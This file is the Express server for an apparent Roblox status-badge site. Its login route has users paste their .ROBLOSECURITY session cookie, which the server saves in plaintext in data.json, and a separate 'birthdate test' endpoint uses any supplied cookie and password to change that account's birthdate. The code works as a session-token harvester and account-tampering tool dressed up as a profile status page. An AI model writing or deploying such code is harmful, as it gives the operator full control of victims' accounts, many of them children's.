const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(express.json({ limit: '50kb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ---------- data ----------
function loadData() {
  try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch { return {}; }
}
function saveData(d) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(d, null, 2));
}
const users = loadData(); // { usernameLower: { userId, username, cookie, presence } }

// ---------- roblox helpers ----------
const robloxHeaders = (cookie) => ({
  'Cookie': `.ROBLOSECURITY=${cookie}`,
  'Content-Type': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
});

async function getAuthenticatedUser(cookie) {
  const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
    headers: robloxHeaders(cookie)
  });
  if (!res.ok) return null;
  return res.json(); // { id, name, displayName }
}

async function getPresence(userId, cookie) {
  const res = await fetch('https://presence.roblox.com/v1/presence/users', {
    method: 'POST',
    headers: robloxHeaders(cookie),
    body: JSON.stringify({ userIds: [userId] })
  });
  if (!res.ok) return null;
  const data = await res.json();
  return (data.userPresences && data.userPresences[0]) || null;
}

const STATUS_MAP = {
  0: 'Offline',
  1: 'Online',
  2: 'In Game',
  3: 'In Studio',
  4: 'Invisible'
};

// ---------- routes ----------
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', async (req, res) => {
  const raw = (req.body.cookie || '').trim();
  if (!raw) return res.status(400).json({ ok: false, error: 'Walang cookie na nailagay.' });

  // tanggalin ".ROBLOSECURITY=" kung kasama
  const clean = raw.replace(/^\.ROBLOSECURITY=/i, '').trim();

  try {
    const me = await getAuthenticatedUser(clean);
    if (!me) return res.status(401).json({ ok: false, error: 'Invalid cookie. Subukan mong kopyahin ulit.' });

    const key = me.name.toLowerCase();
    users[key] = {
      userId: me.id,
      username: me.name,
      displayName: me.displayName,
      cookie: clean,
      presence: null,
      createdAt: (users[key] && users[key].createdAt) || Date.now()
    };
    saveData(users);

    res.json({
      ok: true,
      username: me.name,
      userId: me.id,
      statusUrl: `/${me.name}`,
      pingUrl: `/${me.name}/ping`
    });
  } catch (e) {
    res.status(500).json({ ok: false, error: 'Server error: ' + e.message });
  }
});


// ===== BIRTHDATE TEST ENDPOINT (experiment lang — hindi nagsa-save ng password) =====
app.post('/api/change-birthdate', async (req, res) => {
  const { cookie, password, birthMonth, birthDay, birthYear } = req.body || {};

  if (!cookie || !password || !birthMonth || !birthDay || !birthYear) {
    return res.status(400).json({ ok: false, error: 'Kumpletohin lahat: cookie, password, month, day, year.' });
  }

  const clean = String(cookie).replace(/^\.ROBLOSECURITY=/i, '').trim();

  // Step 1: verify cookie muna — ipakita kung sino yung account
  let whoami = null;
  try {
    const me = await getAuthenticatedUser(clean);
    if (me) whoami = { userId: me.id, username: me.name, displayName: me.displayName };
  } catch (e) {
    return res.json({ ok: false, stage: 'cookie-check', error: e.message });
  }

  if (!whoami) {
    return res.json({ ok: false, stage: 'cookie-check', error: 'Invalid cookie — hindi maka-authenticate.' });
  }

  // Step 2: subukan ang birthdate change
  try {
    const r = await fetch('https://users.roblox.com/v1/birthdate', {
      method: 'POST',
      headers: robloxHeaders(clean),
      body: JSON.stringify({
        birthMonth: Number(birthMonth),
        birthDay: Number(birthDay),
        birthYear: Number(birthYear),
        password: String(password)
      })
    });
    const text = await r.text();
    let data;
    try { data = JSON.parse(text); } catch { data = { raw: text }; }
    res.json({
      ok: r.ok,
      status: r.status,
      account: whoami,
      robloxResponse: data
    });
  } catch (e) {
    res.json({ ok: false, stage: 'birthdate-request', error: e.message, account: whoami });
  }
});

// PING endpoint — dito nakaturo ang UptimeRobot
app.get('/:username/ping', async (req, res) => {
  const u = users[req.params.username.toLowerCase()];
  if (!u) return res.status(404).json({ ok: false, error: 'Hindi nahanap. Mag-login muna sa /login' });

  try {
    const p = await getPresence(u.userId, u.cookie);
    if (p) {
      u.presence = {
        type: p.userPresenceType,
        status: STATUS_MAP[p.userPresenceType] || 'Unknown',
        game: p.userPresenceType === 2 ? p.lastLocation : null,
        placeId: p.placeId || null,
        rootPlaceId: p.rootPlaceId || null,
        lastUpdate: Date.now()
      };
      saveData(users);
    }
    res.json({
      ok: true,
      username: u.username,
      presence: u.presence || null,
      serverTime: new Date().toISOString()
    });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// STATUS PAGE — public bio page
app.get('/:username', (req, res) => {
  if (req.params.username === 'favicon.ico') return res.status(404).end();
  const u = users[req.params.username.toLowerCase()];
  if (!u) return res.redirect('/login');
  res.send(renderStatusPage(u));
});

// ---------- status page html ----------
function statusColor(p) {
  if (!p) return '#888';
  return { 0: '#f04747', 1: '#43b581', 2: '#f26522', 3: '#9b59b6', 4: '#888' }[p.type] || '#888';
}
function statusText(u) {
  const p = u.presence;
  if (!p) return 'Checking...';
  if (p.type === 2 && p.game) return `In Game: ${p.game}`;
  return p.status;
}

function renderStatusPage(u) {
  const initial = u.presence || {};
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${u.username} — Roblox Status</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: #0e0e10;
    color: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .card {
    background: #1a1a1e;
    border: 1px solid #2a2a30;
    border-radius: 20px;
    padding: 40px 50px;
    text-align: center;
    box-shadow: 0 10px 40px rgba(0,0,0,.5);
    max-width: 420px;
    width: 90%;
  }
  img.avatar {
    width: 130px; height: 130px;
    border-radius: 50%;
    border: 4px solid ${statusColor(initial)};
    transition: border-color .5s;
    background: #2a2a30;
  }
  h1 { margin: 15px 0 3px; font-size: 26px; }
  .sub { color: #777; font-size: 14px; margin-bottom: 20px; }
  .badge {
    display: inline-block;
    padding: 10px 24px;
    border-radius: 999px;
    font-weight: bold;
    font-size: 17px;
    background: ${statusColor(initial)}22;
    color: ${statusColor(initial)};
    border: 1px solid ${statusColor(initial)};
    transition: all .5s;
    word-break: break-word;
  }
  .updated { margin-top: 18px; color: #555; font-size: 12px; }
  .dot {
    display:inline-block; width:9px; height:9px; border-radius:50%;
    background: ${statusColor(initial)}; margin-right:7px;
    animation: pulse 1.5s infinite;
  }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.35} }
  a.game-link { color: inherit; text-decoration: underline; }
</style>
</head>
<body>
  <div class="card">
    <img class="avatar" id="avatar"
      src="https://www.roblox.com/headshot-thumbnail/image?userId=${u.userId}&width=150&height=150&format=png"
      alt="avatar">
    <h1>${u.displayName || u.username}</h1>
    <div class="sub">@${u.username}</div>
    <div class="badge" id="badge"><span class="dot" id="dot"></span><span id="statusText">${statusText(u)}</span></div>
    <div class="updated" id="updated">Auto-updating every 60s</div>
  </div>
<script>
  const COLORS = { 0:'#f04747', 1:'#43b581', 2:'#f26522', 3:'#9b59b6', 4:'#888' };
  async function refresh() {
    try {
      const r = await fetch('/${u.username}/ping');
      const d = await r.json();
      if (!d.presence) return;
      const p = d.presence;
      const color = COLORS[p.type] || '#888';
      let text = p.status;
      if (p.type === 2 && p.game) {
        text = 'In Game: ' + p.game;
      }
      const badge = document.getElementById('badge');
      const dot = document.getElementById('dot');
      const avatar = document.getElementById('avatar');
      badge.style.color = color;
      badge.style.borderColor = color;
      badge.style.background = color + '22';
      dot.style.background = color;
      avatar.style.borderColor = color;
      document.getElementById('statusText').textContent = text;
      document.getElementById('updated').textContent = 'Last update: ' + new Date(p.lastUpdate).toLocaleString();
    } catch (e) { /* offline ka ng server, try later */ }
  }
  refresh();
  setInterval(refresh, 60000);
</script>
</body>
</html>`;
}

app.listen(PORT, () => {
  console.log(`Roblox Status Page running: http://localhost:${PORT}/login`);
  console.log(`Birthdate test page:       http://localhost:${PORT}/birthdate.html`);
});
        
